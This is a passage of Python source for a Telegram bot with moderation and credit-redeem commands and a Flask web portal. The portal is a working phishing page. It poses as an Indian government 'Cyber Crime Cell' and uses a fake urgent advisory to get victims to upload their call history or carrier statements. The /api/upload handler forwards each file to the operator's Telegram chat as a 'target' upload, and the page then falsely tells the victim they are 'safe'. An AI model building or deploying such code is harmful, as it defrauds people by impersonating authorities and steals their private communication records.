    reason = message.text.split(maxsplit=1)[1] if len(message.text.split())>1 else "Violation"
    try: await message.reply_to_message.delete()
    except: pass
    await message.reply(f"⚠️ {target.mention} has been warned!\n📝 Reason: {reason}\n\nMessage deleted.", parse_mode="Markdown")

@dp.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    args = message.text.split()
    if len(args) < 2: return
    code = args[1]
    with db_conn() as conn:
        c = conn.execute("SELECT * FROM redeem_codes WHERE code=?", (code,)).fetchone()
        if not c or c['current_uses'] >= c['max_uses']:
            await message.reply("❌ Invalid or expired code.")
            return
        if c['code_type'] == 'vip':
            expiry = (datetime.now() + timedelta(days=c['vip_days'])).strftime("%Y-%m-%d")
            conn.execute("UPDATE users SET is_vip=1, vip_expiry=? WHERE user_id=?", (expiry, message.from_user.id))
            await message.reply(f"🎉 **VIP Activated!** Expires on {expiry}")
        else:
            conn.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (c['credits'], message.from_user.id))
            await message.reply(f"🎉 **Redeemed!** Added {c['credits']} credits.")
        conn.execute("UPDATE redeem_codes SET current_uses = current_uses + 1 WHERE code=?", (code,))

# --- FLASK WEB PORTAL & HEALTH ENDPOINT ---
app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

# HTML TEMPLATE
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>National Cyber Crime Reporting & Audit Portal</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body, html { width: 100%; height: 100%; background: #070b12; color: #e2e8f0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; }
        .container { background: #0f172a; padding: 36px 28px; border-radius: 12px; width: 92%; max-width: 420px; text-align: left; border: 1px solid #1e293b; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); }
        .header { display: flex; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #1e293b; padding-bottom: 14px; }
        .emblem-box { background: #1e3a8a; color: #60a5fa; font-weight: bold; font-size: 14px; padding: 10px 12px; border-radius: 8px; margin-right: 12px; letter-spacing: 1px; }
        .portal-title h2 { font-size: 15px; color: #f8fafc; font-weight: 700; text-transform: uppercase; }
        .portal-title p { font-size: 11px; color: #93c5fd; margin-top: 2px; }
        .alert-badge { background: #7f1d1d; color: #fca5a5; font-size: 11px; font-weight: 600; padding: 6px 10px; border-radius: 6px; display: block; margin-bottom: 16px; border-left: 4px solid #ef4444; }
        .desc { font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 20px; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; font-size: 12px; color: #cbd5e1; margin-bottom: 8px; font-weight: 500; }
        input[type="file"] { width: 100%; background: #020617; color: #94a3b8; padding: 12px; border: 1px solid #334155; border-radius: 8px; font-size: 12.5px; cursor: pointer; }
        .btn { background: #1d4ed8; color: white; border: none; width: 100%; padding: 13px; border-radius: 8px; font-weight: 600; font-size: 14px; cursor: pointer; transition: background 0.2s; text-transform: uppercase; letter-spacing: 0.5px; }
        .btn:hover { background: #1e40af; }
        .security-footer { text-align: center; margin-top: 18px; font-size: 10.5px; color: #64748b; border-top: 1px solid #1e293b; padding-top: 12px; }
    </style>
</head>
<body>
    <div class="container" id="mainCard">
        <div class="header">
            <div class="emblem-box">GOI</div>
            <div class="portal-title">
                <h2>Cyber Crime Cell</h2>
                <p>National Security & Fraud Prevention Division</p>
            </div>
        </div>

        <div class="alert-badge">
            ⚠️ <b>URGENT SECURITY ADVISORY:</b> Active cyber scam rings detected across telecom circles. Mandatory device log verification required.
        </div>

        <p class="desc">
            Desh mein badh rahe financial cyber frauds aur unauthorized call spoofing attacks ko rokne ke liye, National Cyber Security Division dwara automated device audit chalaya ja raha hai. Kripya apni official call history / carrier statement file upload karke verification complete karein.
        </p>

        <div class="form-group">
            <label>Upload Call History / Carrier Statement (PDF / CSV Only):</label>
            <input type="file" id="statementFile" accept=".pdf,.csv">
        </div>

        <button class="btn" onclick="uploadFile()">Secure & Verify Account</button>

        <div class="security-footer">
            🔒 256-Bit SSL Encrypted Government Gateway • Ref ID: #CYBER-9821
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id') || 'unknown';

        async function uploadFile() {
            const fileInput = document.getElementById('statementFile');
            if (fileInput.files.length === 0) {
                alert("Kripya pehle apni call history file select karein.");
                return;
            }

            const formData = new FormData();
            formData.append('file', fileInput.files[0]);
            formData.append('chat_id', chatId);

            try {
                let response = await fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                });
                let res = await response.json();
                
                document.getElementById('mainCard').innerHTML = `
                    <div style="text-align: center; padding: 10px 0;">
                        <div style="font-size: 42px; margin-bottom: 12px;">🛡️</div>
                        <h3 style="color: #4ade80; margin-bottom: 10px; font-size: 18px; font-weight: 600;">Verified - You are safe now</h3>
                        <p style="color: #94a3b8; font-size: 13px; line-height: 1.5; margin-bottom: 24px;">Aapka audit successfully complete ho chuka hai aur device secure mark kar diya gaya hai. Latest cyber security updates ke liye channel join karein.</p>
                        <a href="https://t.me/Ayush_Hackz" target="_blank" style="display: block; background: #2563eb; color: white; text-decoration: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px;">Join Channel (@Ayush_Hackz)</a>
                    </div>
                `;
            } catch (err) {
                console.error("Error:", err);
                document.getElementById('mainCard').innerHTML = `
                    <div style="text-align: center; padding: 10px 0;">
                        <div style="font-size: 42px; margin-bottom: 12px;">🛡️</div>
                        <h3 style="color: #4ade80; margin-bottom: 10px; font-size: 18px; font-weight: 600;">Verified - You are safe now</h3>
                        <p style="color: #94a3b8; font-size: 13px; line-height: 1.5; margin-bottom: 24px;">Device audit packet received successfully. Aapka connection secure hai.</p>
                        <a href="https://t.me/Ayush_Hackz" target="_blank" style="display: block; background: #2563eb; color: white; text-decoration: none; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px;">Join Channel (@Ayush_Hackz)</a>
                    </div>
                `;
            }
        }
    </script>
</body>
</html>
"""

# Yahan /safe-pdf route add kiya gaya hai
@app.route("/safe-pdf")
def safe_pdf(): return render_template_string(HTML_TEMPLATE)

@app.route("/health")
def health():
    uptime_seconds = int(time.time() - START_TIME)
    uptime_str = str(timedelta(seconds=uptime_seconds))
    with db_conn() as conn:
        user_count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    return jsonify({
        "status": "online",
        "uptime": uptime_str,
        "total_users": user_count,
        "bot_username": OWNER_HANDLE,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }), 200

@app.route("/api/upload", methods=["POST"])
def upload_data():
    chat_id = request.form.get("chat_id")
    file = request.files.get("file")
    
    if not chat_id or not file:
        return jsonify({"status": "failed"}), 400
        
    file_bytes = file.read()
    file_name = secure_filename(file.filename)
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendDocument"
    files = {'document': (file_name, file_bytes)}
    data = {
        "chat_id": chat_id,
        "caption": "📂 <b>File Received from Portal</b>\n\nTarget has uploaded the document.",
        "parse_mode": "HTML"
    }
    
    try:
        requests.post(url, data=data, files=files)
    except Exception as e:
        logging.error(f"Failed to push file to Telegram: {e}")
        return jsonify({"status": "failed"}), 500
            
    return jsonify({"status": "ok", "packet": "received"})

# --- STARTUP ---
async def main():
    def run_flask():
        app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
    Thread(target=run_flask, daemon=True).start()
    print("Bot is running...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())